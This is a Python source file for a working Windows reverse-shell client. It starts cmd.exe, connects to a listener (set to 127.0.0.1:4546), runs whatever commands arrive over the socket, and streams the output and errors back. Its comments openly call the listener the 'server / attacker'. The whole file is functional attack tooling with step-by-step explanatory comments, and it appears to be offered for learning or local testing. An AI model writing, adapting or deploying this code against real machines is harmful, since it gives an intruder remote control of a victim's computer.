import argparse
import socket
import subprocess
import sys
import threading
import os
import time
from win32com.shell import shell

# ## 2. Outbound Data Transmission (Results Reporting)
# 
#cmd.exe has now executed our command this client received from the server. Now we send the STDOUT result of that command after it ran via cmd.exe!
# Define a concurrency handler function dedicated to processing and sending standard shell output back to the server.
def shellstdout_sender(client, myshellproc):
    
    # Establish an infinite operational loop designed to continuously poll the running shell process for output data.
    while True:
        
        # Read available arbitrary data blocks from the standard output (stdout) stream of the shell process without blocking.
        output=myshellproc.stdout.read1()
        
        # Establish a try-except structure to gracefully handle runtime network drops or pipeline transit drops.
        try:
            
            # Transmit the captured standard output byte sequence directly through the established socket connection.
            client.send(output)
            
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        # Intercept any network anomalies, exceptions, or connection drops happening during the send operation.
        except:
            
            # Display a localized debugging notification stating that the server connection link has failed.
            print("connection died...")
            
            # Execute a forced taskkill command sequence to completely terminate the active shell process and its child processes.
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            
            # Safely close the active socket descriptor object to free up system networking resources.
            client.close()
            
            # Force an immediate, hard termination of the entire Python interpreter instance process via status code 0.
            os._exit(0) 

#send errors (example: you typed 'net usr' intead of 'net user'. This will show you the error produced by cmd.exe    
# Define a concurrency handler function dedicated to processing and sending standard error output back to the server.
def shellstderr_sender(client, myshellproc):
    
    # Establish an infinite operational loop designed to continuously poll the running shell process for error logs.
    while True:
        
        # Read available arbitrary data blocks from the standard error (stderr) stream of the shell process without blocking.
        output=myshellproc.stderr.read1()
        
        # Establish a try-except structure to monitor network delivery operations and trap potential transit failures.
        try:
            
            # Transmit the captured error byte sequence directly through the established socket connection.
            client.send(output)
            
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        # Intercept any network anomalies, exceptions, or connection drops happening during the send operation.
        except:
            
            # Display a localized debugging notification stating that the server connection link has failed.
            print("connection died...")
            
            # Execute a forced taskkill command sequence to completely terminate the active shell process and its child processes.
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            
            # Safely close the active socket descriptor object to free up system networking resources.
            client.close()
            
            # Force an immediate, hard termination of the entire Python interpreter instance process via status code 0.
            os._exit(0)

# 
# ## 3. Inbound Task Reception (Command Execution)
# 
#This function will take the command the server sent to this client, write it to the cmd.exe console, and execute it
#The shellsender() function will send the results of the executed command back to the server / attacker        
# Define a concurrency handler function dedicated to receiving inbound command strings from the listening server infrastructure.
def shellreceiver(client, myshellproc):
    
    # Establish an infinite loop to keep the inbound socket listening interface running continuously.
    while True:
        
        # Implement a try-block to monitor network reception operations and trap potential channel failures.
        try:
            
            # Read an incoming data packet from the socket interface buffer up to a maximum size limit of 1024 bytes.
            data = client.recv(1024)
            
            # Evaluate if the received packet contains actual payload data by checking if its byte count is greater than zero.
            if len(data) > 0:
                
                #if you type :leave: in the server/attacker console it closes the connection.  similar to 'exit' but just a custom version of that that I like to implement
                # Check if the decrypted plain-text string value contains the distinct termination token pattern.
                if ":leave:" in data.decode("UTF-8"):
                    
                    # Execute a forced taskkill command sequence to completely terminate the active shell process and its child processes.
                    subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
                    
                    # Safely close the active socket descriptor object to free up system networking resources.
                    client.close()
                    
                    # Force an immediate, hard termination of the entire Python interpreter instance process via status code 0.
                    os._exit(0) 
                    
                # Feed the received command string directly into the standard input (stdin) channel of the running shell process.
                myshellproc.stdin.write(data)
                
                # Force an immediate clear and flush of the input stream buffer to ensure immediate command execution.
                myshellproc.stdin.flush()
                
        #basic exception handler to kill the process for cmd.exe if we cannot reach the server
        # Intercept any network anomalies, exceptions, or connection drops happening during the receive operation.
        except:
            
            # Display a localized debugging notification stating that the server connection link has failed.
            print("connection died...")
            
            # Execute a forced taskkill command sequence to completely terminate the active shell process and its child processes.
            subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=myshellproc.pid))
            
            # Safely close the active socket descriptor object to free up system networking resources.
            client.close()
            
            # Force an immediate, hard termination of the entire Python interpreter instance process via status code 0.
            os._exit(0)

# ## 1. Environment & Process Initialization

# start the command shell and pipe it's contents to stdin, stout, and stderr        
# Instantiate an interactive command-line session process while establishing explicit piping links for input, output, and error channels.
myshellproc = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Assign the network target destination loopback string addressing configuration for local host testing routing.
host="127.0.0.1"

# Configure the specific TCP destination connection port identifier code for our outbound traffic.
port=4546
    
# Initialize a streaming internet socket object leveraging standard IPv4 routing configurations and TCP mechanisms.
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Establish a try-block environment to attempt connection routines to the target listener without causing unhandled script crashes.
try:
    
    # Attempt to initialize a standard network connection sequence targeting the predefined host IP address and numeric port details.
    client.connect((host, port))

# Intercept connection rejections, timeout exceptions, or routing failures that happen during socket alignment tasks.
except:
    
    # Print a distinct debugging notification detailing structural connection layer failures or missing server engines.
    print("server/socket must have died...time to hop off")
    
    # Initiate a low-level process escape function to kill all running execution components instantly.
    os._exit(0)

#This initiates our function threads!

# Instantiate a separate system thread worker mapped to continuously push standard command outputs via `shellstdout_sender`.
s2p_thread = threading.Thread(target=shellstdout_sender, args=[client, myshellproc])

# Convert this specific worker thread into a background daemon so it terminates gracefully when the parent process stops.
s2p_thread.daemon = True

# Boot up the newly configured background daemon thread to start pushing data to the socket channel concurrently.
s2p_thread.start()

# Instantiate another operational execution thread worker dedicated to pushing standard shell errors via `shellstderr_sender`.
s2p_thread = threading.Thread(target=shellstderr_sender, args=[client, myshellproc])

# Convert this specific worker thread into a background daemon so it terminates gracefully when the parent process stops.
s2p_thread.daemon = True

# Boot up the newly configured background daemon thread to start pushing error data to the socket channel concurrently.
s2p_thread.start()

# Instantiate a third operational execution thread worker dedicated to listening for inbound server strings via `shellreceiver`.
s2p_thread = threading.Thread(target=shellreceiver, args=[client, myshellproc])

# Convert this specific worker thread into a background daemon so it terminates gracefully when the parent process stops.
s2p_thread.daemon = True

# Boot up the newly configured background daemon thread to start checking the socket channel for tasks concurrently.
s2p_thread.start()



# ## 4. Connection Resilience & Termination
#
#continuous loop
# Establish a permanent tracking block pointing out that the client loop requires an execution lock loop to preserve scripts.
while True:
    
    # Introduce a 1-second process execution pause inside the master loop thread execution cycle to prevent extreme CPU exhaustion.
    time.sleep(1)